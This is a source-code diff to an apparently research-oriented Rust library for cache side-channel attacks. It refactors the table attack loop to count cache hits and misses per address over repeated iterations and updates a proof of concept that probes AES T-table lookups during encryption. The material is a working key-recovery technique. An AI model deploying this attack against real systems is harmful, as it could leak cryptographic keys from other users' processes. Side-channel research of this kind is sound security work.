@@ -66,6 +66,21 @@ pub trait SimpleCacheSideChannel {
     // TODO
 }
 
+pub struct TableAttackResult {
+    pub addr: *const u8,
+    hit: u32,
+    miss: u32,
+}
+
+impl TableAttackResult {
+    fn get(&self, cache_status: CacheStatus) -> u32 {
+        match cache_status {
+            CacheStatus::Hit => self.hit,
+            CacheStatus::Miss => self.miss,
+        }
+    }
+}
+
 pub trait TableCacheSideChannel {
     //type ChannelFatalError: Debug;
     /// # Safety
@@ -82,7 +97,8 @@ pub trait TableCacheSideChannel {
         &'a mut self,
         addresses: impl IntoIterator<Item = *const u8> + Clone,
         victim: &'b dyn Fn(),
-    ) -> Result<Vec<(*const u8, CacheStatus)>, ChannelFatalError>;
+        num_iteration: u32,
+    ) -> Result<Vec<TableAttackResult>, ChannelFatalError>;
 }
 
 pub trait SingleAddrCacheSideChannel: Debug {
@@ -143,37 +159,71 @@ impl<T: SingleAddrCacheSideChannel> TableCacheSideChannel for T {
     }
     //type ChannelFatalError = T::SingleChannelFatalError;
 
-    default unsafe fn attack<'a, 'b, 'c>(
+    default unsafe fn attack<'a, 'b>(
         &'a mut self,
         addresses: impl IntoIterator<Item = *const u8> + Clone,
-        victim: &'c dyn Fn(),
-    ) -> Result<Vec<(*const u8, CacheStatus)>, ChannelFatalError> {
+        victim: &'b dyn Fn(),
+        num_iteration: u32,
+    ) -> Result<Vec<TableAttackResult>, ChannelFatalError> {
         let mut result = Vec::new();
 
         for addr in addresses {
-            match unsafe { self.prepare_single(addr) } {
-                Ok(_) => {}
-                Err(e) => match e {
-                    SideChannelError::NeedRecalibration => unimplemented!(),
-                    SideChannelError::FatalError(e) => return Err(e),
-                    SideChannelError::AddressNotReady(_addr) => panic!(),
-                    SideChannelError::AddressNotCalibrated(_addr) => unimplemented!(),
-                },
-            }
-            self.victim_single(victim);
-            let r = unsafe { self.test_single(addr) };
-            match r {
-                Ok(status) => {
-                    result.push((addr, status));
+            let mut hit = 0;
+            let mut miss = 0;
+            for iteration in 0..100 {
+                match unsafe { self.prepare_single(addr) } {
+                    Ok(_) => {}
+                    Err(e) => match e {
+                        SideChannelError::NeedRecalibration => unimplemented!(),
+                        SideChannelError::FatalError(e) => return Err(e),
+                        SideChannelError::AddressNotReady(_addr) => panic!(),
+                        SideChannelError::AddressNotCalibrated(_addr) => unimplemented!(),
+                    },
                 }
-                Err(e) => match e {
-                    SideChannelError::NeedRecalibration => panic!(),
-                    SideChannelError::FatalError(e) => {
-                        return Err(e);
-                    }
-                    _ => panic!(),
-                },
+                self.victim_single(victim);
+                let r = unsafe { self.test_single(addr) };
+                match r {
+                    Ok(status) => {}
+                    Err(e) => match e {
+                        SideChannelError::NeedRecalibration => panic!(),
+                        SideChannelError::FatalError(e) => {
+                            return Err(e);
+                        }
+                        _ => panic!(),
+                    },
+                }
             }
+            for _iteration in 0..num_iteration {
+                match unsafe { self.prepare_single(addr) } {
+                    Ok(_) => {}
+                    Err(e) => match e {
+                        SideChannelError::NeedRecalibration => unimplemented!(),
+                        SideChannelError::FatalError(e) => return Err(e),
+                        SideChannelError::AddressNotReady(_addr) => panic!(),
+                        SideChannelError::AddressNotCalibrated(_addr) => unimplemented!(),
+                    },
+                }
+                self.victim_single(victim);
+                let r = unsafe { self.test_single(addr) };
+                match r {
+                    Ok(status) => match status {
+                        CacheStatus::Hit => {
+                            hit += 1;
+                        }
+                        CacheStatus::Miss => {
+                            miss += 1;
+                        }
+                    },
+                    Err(e) => match e {
+                        SideChannelError::NeedRecalibration => panic!(),
+                        SideChannelError::FatalError(e) => {
+                            return Err(e);
+                        }
+                        _ => panic!(),
+                    },
+                }
+            }
+            result.push(TableAttackResult { addr, hit, miss });
         }
         Ok(result)
     }
@@ -204,31 +254,26 @@ impl<T: MultipleAddrCacheSideChannel> SingleAddrCacheSideChannel for T {
     }
 }
 
-fn table_cache_side_channel_calibrate_impl<T: MultipleAddrCacheSideChannel>(
-    s: &mut T,
-    addresses: impl IntoIterator<Item = *const u8> + Clone,
-) -> Result<(), ChannelFatalError> {
-    unsafe { s.calibrate(addresses) }
-}
-
+// TODO limit number of simultaneous tested address + randomise order ?
+/*
 impl<T: MultipleAddrCacheSideChannel> TableCacheSideChannel for T {
     unsafe fn calibrate(
         &mut self,
         addresses: impl IntoIterator<Item = *const u8> + Clone,
     ) -> Result<(), ChannelFatalError> {
-        table_cache_side_channel_calibrate_impl(self, addresses)
-        //self.calibrate(addresses)
+        unsafe { s.calibrate(addresses) }
     }
     //type ChannelFatalError = T::MultipleChannelFatalError;
 
     /// # Safety
     ///
     /// addresses must contain only valid pointers to read.
-    unsafe fn attack<'a, 'b, 'c>(
+    unsafe fn attack<'a, 'b>(
         &'a mut self,
         addresses: impl IntoIterator<Item = *const u8> + Clone,
-        victim: &'c dyn Fn(),
-    ) -> Result<Vec<(*const u8, CacheStatus)>, ChannelFatalError> {
+        victim: &'b dyn Fn(),
+        num_iteration: u32,
+    ) -> Result<Vec<TableAttackResult>, ChannelFatalError> {
         match unsafe { MultipleAddrCacheSideChannel::prepare(self, addresses.clone()) } {
             Ok(_) => {}
             Err(e) => match e {
@@ -252,7 +297,7 @@ impl<T: MultipleAddrCacheSideChannel> TableCacheSideChannel for T {
             Ok(v) => Ok(v),
         }
     }
-}
+}*/
 
 pub struct AESTTableParams<'a> {
     pub num_encryptions: u32,
@@ -321,32 +366,19 @@ pub unsafe fn attack_t_tables_poc(
             aes_ige(&plaintext, &mut result, &key_struct, &mut iv, Mode::Encrypt);
         };
 
-        for _ in 0..100 {
-            let r = unsafe { side_channel.attack(addresses.clone(), &victim) };
-            match r {
-                Ok(v) => {
-                    for (probe, status) in v {
-                        if status == Miss {
-                            *timings.get_mut(&probe).unwrap().entry(b).or_insert(0) += 0;
-                        }
-                    }
+        let r =
+            unsafe { side_channel.attack(addresses.clone(), &victim, parameters.num_encryptions) };
+        match r {
+            Ok(v) => {
+                for table_attack_result in v {
+                    *timings
+                        .get_mut(&table_attack_result.addr)
+                        .unwrap()
+                        .entry(b)
+                        .or_insert(0) += table_attack_result.get(Miss);
                 }
-                Err(_) => panic!("Attack failed"),
             }
-        }
-
-        for _ in 0..parameters.num_encryptions {
-            let r = unsafe { side_channel.attack(addresses.clone(), &victim) };
-            match r {
-                Ok(v) => {
-                    for (probe, status) in v {
-                        if status == Miss {
-                            *timings.get_mut(&probe).unwrap().entry(b).or_insert(0) += 1;
-                        }
-                    }
-                }
-                Err(_) => panic!("Attack failed"),
-            }
+            Err(_) => panic!("Attack failed"),
         }
     }
     for probe in addresses {
